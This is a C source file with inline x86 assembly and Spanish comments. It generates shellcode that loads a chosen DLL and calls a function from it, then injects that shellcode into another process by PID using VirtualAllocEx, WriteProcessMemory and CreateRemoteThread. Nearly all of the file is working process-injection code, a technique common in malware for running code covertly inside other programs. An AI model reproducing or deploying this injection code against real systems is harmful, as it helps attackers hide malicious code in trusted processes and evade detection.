#include "shellcode.h"


LPBYTE MakeShellCode(LPINT size, LPTSTR module,  LPTSTR function)
{

LPBYTE pInicio;
int offFirstcall, offSecondcall, off2ndDllName;

int cArgv1;
LPBYTE v;
int n, n2;
HMODULE h;

__asm {  
inicio:

    call delta
delta:
    pop ebx
    sub ebx, offset delta
    jz no_inyect
  
 
    lea eax, cs:[no_inyect+ebx]  // LA PRIMERA CADENA ESTARA AHI CUANDO ESTEMOS INYECTADOS
    push eax

   

first_call:
    mov eax, 00000000h      // LLAMAR A LoadLibraryA
    call eax
    
second_str:        
    mov ecx, 00000000h  // TAMAÑO DE LA PRIMERA CADENA PARA PODER SACAR EL OFFSET DE LA SEGUNDA
    lea ecx, cs:[no_inyect+ecx+ebx]
    push ecx    // OFFSET DEL NOMBRE DE LA FUNCION A LA PILA
    push eax    // HANDLE A NUESTRA DLL

second_call:            // LLAMAR A  CON LA FUNCION DE NUESTRA DLL
    mov eax, 00000000h
    call eax
    
    call eax  // LLAMAR A LA FUNCION DE LA DLL  
    ret

    

no_inyect:              // CALCULAR TAMAÑO DEL CODIGO DE LA FUNCION
    mov pInicio, offset inicio
    mov ebx, offset inicio

    mov ecx, offset first_call    
    sub ecx, ebx                   // SACAR OFFSET DEL PRIMER CALL
    inc ecx                    // SACAR OFFSET DEL OPERANDO DEL CALL
    mov offFirstcall, ecx

    mov ecx, offset second_call    // SACAR OFFSET SEGUNDO CALL
    sub ecx, ebx                   // SACAR OFFSET DEL OPERANDO DEL CALL
    inc ecx
    mov offSecondcall, ecx

    mov ecx, offset second_str    // SACAR OFFSET SEGUNDO CALL
    sub ecx, ebx                   // SACAR OFFSET DEL OPERANDO DEL CALL
    inc ecx
    mov off2ndDllName, ecx
      
    
    mov ecx, offset no_inyect     // SACAR OFFSET AL FINAL DEL SHELLCODE
    sub ecx, ebx
    mov n, ecx  // SACAR TAMAÑO DE LA FUNCION
}


// CALCULAR TAMAÑO TOTAL DEL SHELLCODE (CODIGO+DATOS)
cArgv1=strlen(module)+1; 
n2=n+cArgv1+strlen(function)+1; // EL +1 ES PARA EL TERMINADORES NULOS

v=(LPBYTE)malloc(n2);   // VECTOR DONDE LO COPIARE
BZERO(v, n2); // PONER A 0'S EL VECTOR
memcpy(v, pInicio, n); // COPIAR EL SHELLCODE AL PPIO


h=LoadLibrary("kernel32.dll");
CAST(FARPROC, v[offFirstcall])=GetProcAddress(h, "LoadLibraryA");   // Y AL FINAL PUEDE HACER SE ASI...
CAST(FARPROC, v[offSecondcall])=GetProcAddress(h, "GetProcAddress");
//*(FARPROC *)(&v[f])=GetProcAddress(h, "LoadLibraryA"); // NADIE SABE LO QUE ME HAN COSTADO ESTOS CASTINGS
//*(FARPROC *)(&v[s])=GetProcAddress(h, "GetProcAddress"); 


strcpy(PTRTO(TCHAR, &v[n]), module);         // COPIAR NOMBRES DE MODULO Y FUNCION
strcpy(PTRTO(TCHAR, &v[n+cArgv1]), function);
CAST(DWORD, v[off2ndDllName])=cArgv1;



//CloseHandle(h);



*size=n2;
return v;

}


DWORD InjectShellCode(DWORD pid, LPBYTE shellcode, INT size)
{
HANDLE hProc;
LPVOID remoteBase;
BOOL bProc=FALSE;
DWORD aux;

hProc=OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
if(!hProc)  return GetLastError();  //printf("No se pudo abrir proceso %p", pid);

remoteBase=VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);



bProc=WriteProcessMemory(hProc, remoteBase, shellcode, size, &aux);
if(!bProc) GetLastError(); //printf("EXITO AL ESCRIBIR");

// CREAR THREAD EN hProc, COMENZANDO EN LA DIRECCION remoteBase DE SU ESPACIO DE DIRECCIONES
CreateRemoteThread(hProc, NULL, 0, (unsigned long (__stdcall *)(void *))remoteBase, NULL, 0, NULL);


return 0;
}


